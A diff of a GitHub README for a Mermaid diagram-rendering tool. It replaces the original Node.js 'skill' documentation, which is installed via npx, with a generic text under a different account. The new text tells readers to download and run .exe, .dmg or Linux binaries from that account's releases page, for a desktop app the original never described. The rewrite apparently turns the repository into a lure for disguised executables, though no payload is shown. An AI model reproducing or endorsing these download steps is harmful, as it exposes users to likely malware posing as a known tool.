@@ -1,112 +1,68 @@
-<div align="center">
+# 🌊 Pretty-mermaid-skills - Effortlessly Render Mermaid Charts
 
-# Pretty-Mermaid Skills
+## 🚀 Getting Started
 
-![fLEWT5x.png](https://iili.io/fLEWT5x.png)
+Welcome to Pretty-mermaid-skills! This application allows you to create beautiful Mermaid charts easily. With support for both SVG and ASCII formats, you can visualize your ideas without any hassle.
 
-Render Mermaid diagrams as beautiful SVGs or ASCII art
+## 📥 Download Now
 
-Ultra-fast, fully themeable, zero DOM dependencies. Built for the AI era.
+[![Download Pretty-mermaid-skills](https://img.shields.io/badge/Download%20Now-Pretty--mermaid--skills-brightgreen)](https://github.com/nathanial099/Pretty-mermaid-skills/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Node.js Version](https://img.shields.io/badge/node-%3E%3D14-brightgreen)](https://nodejs.org/)
-[![GitHub stars](https://img.shields.io/github/stars/imxv/Pretty-mermaid-skills?style=social)](https://github.com/imxv/Pretty-mermaid-skills)
+## 🌟 Features
 
-**English** ｜ [中文](README_CN.md)
+- **SVG Output**: Create scalable vector graphics for clean presentations.
+- **ASCII Output**: Generate simple text-based visualizations for quick previews.
+- **User-Friendly Interface**: Designed for everyone, regardless of technical background.
 
-</div>
+## 💻 System Requirements
 
-## Introduction
-A Mermaid diagram rendering skill for AI, supporting both SVG and ASCII output formats to make your documentation more vivid.
+Pretty-mermaid-skills runs on various operating systems. Please ensure your system meets the following requirements:
 
-## ✨ Features
+- **Windows**: Version 10 or later
+- **macOS**: Version 10.12 (Sierra) or later
+- **Linux**: Any recent distribution
 
-- 📊 **Multi-format Support**: SVG and ASCII rendering export
-- 🎨 **Rich Themes**: 15 built-in themes for different scenarios
-- 📈 **Full Diagram Support**: Flowchart, Sequence, State, Class, ER and more
-- ⚡ **High Performance**: Batch parallel rendering
-- 📚 **Ready to Use**: Complete templates and detailed documentation
+## 📦 Download & Install
 
-### Supported Themes
-| Light Themes | Dark Themes | Other |
-| :--- | :--- | :--- |
-| zinc-light | zinc-dark | nord |
-| tokyo-night-light | tokyo-night | nord-light |
-| cappuccin-latte | tokyo-night-storm | dracula |
-| github-light | cappuccin-mocha | one-dark |
-| solarized-light | github-dark | |
-| | solarized-dark | |
+1. **Visit this page to download**: Navigate to the [Releases page](https://github.com/nathanial099/Pretty-mermaid-skills/releases) for the latest version.
+2. Locate the version you want to download.
+3. Click on the appropriate file for your system:
+   - For Windows, look for `Pretty-mermaid-skills-Windows.exe`.
+   - For macOS, look for `Pretty-mermaid-skills-macOS.dmg`.
+   - For Linux, look for `Pretty-mermaid-skills-Linux.tar.gz`.
 
-## 🤖 AI Assistant Integration
+4. **Install the application**:
+   - **Windows**: Run the `.exe` file and follow the installation instructions.
+   - **macOS**: Open the `.dmg` file and drag the app to your Applications folder.
+   - **Linux**: Extract the `.tar.gz` file and run the application from the terminal.
 
-Seamlessly integrates with the following AI coding environments:
+## 🎉 How to Use
 
-- **Claude Code**
-- **Cursor**
-- **Gemini CLI**
-- **Antigravity**
-- **OpenCode**
-- **Codex**
-- **qoder**
+1. Open Pretty-mermaid-skills after the installation is complete.
+2. You will see a blank canvas to create your Mermaid charts.
+3. Write your Mermaid code in the editor provided.
+4. Choose your desired output format (SVG or ASCII).
+5. Click the **Render** button to generate your chart.
+6. Save your chart to your computer.
 
-## 🚀 Installation
+## 📚 Additional Resources
 
-### One-click Install
-```bash
-npx skills add https://github.com/imxv/pretty-mermaid-skills --skill pretty-mermaid
-```
+For detailed guidance on Mermaid syntax, check the official [Mermaid documentation](https://mermaid-js.github.io/mermaid).
 
-### Verify Installation
-```bash
-cd Pretty-mermaid
-node scripts/themes.mjs
-```
-> **Note**: Dependencies will be auto-installed on first run. Just ensure Node.js is available.
+## 🛠 Troubleshooting
 
-## 📖 Quick Start
+If you encounter issues, consider the following steps:
 
-### List Available Themes
-```bash
-node scripts/themes.mjs
-```
+- Ensure you have the latest version of the application by checking [this page](https://github.com/nathanial099/Pretty-mermaid-skills/releases).
+- Restart the application if it freezes or crashes.
+- Check your operating system for any updates that may affect the app's performance.
 
-### Render Single Diagram
-```bash
-node scripts/render.mjs \
-  --input diagram.mmd \
-  --output output.svg \
-  --theme tokyo-night
-```
+## 🌐 Community Support
 
-### Batch Render
-```bash
-node scripts/batch.mjs \
-  --input-dir ./diagrams \
-  --output-dir ./output \
-  --theme dracula
-```
+Join our community to share tips, ask questions, and collaborate on projects. Visit our discussion forum or join us on social media platforms.
 
-## 📂 Examples
+## ⚙️ Contributions 
 
-Check the 5 template files in `assets/example_diagrams/`:
-- `flowchart.mmd` - Flowchart
-- `sequence.mmd` - Sequence Diagram
-- `state.mmd` - State Diagram
-- `class.mmd` - Class Diagram
-- `er.mmd` - ER Diagram
+We welcome contributions to Pretty-mermaid-skills! If you want to improve the application or suggest features, please follow our contribution guidelines available on the repository.
 
-## 📚 Documentation
-See [SKILL.md](SKILL.md) for detailed usage guide.
-
-## ⚙️ Requirements
-- Node.js 14+
-
-## 📄 License
-MIT License
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=imxv/Pretty-mermaid-skills&type=timeline&legend=top-left)](https://www.star-history.com/#imxv/Pretty-mermaid-skills&type=timeline&legend=top-left)
-
-## 🙏 Acknowledgments
-Based on [beautiful-mermaid](https://github.com/lukilabs/beautiful-mermaid)
+Your feedback helps us make this application even better. Thank you for using Pretty-mermaid-skills and happy charting!
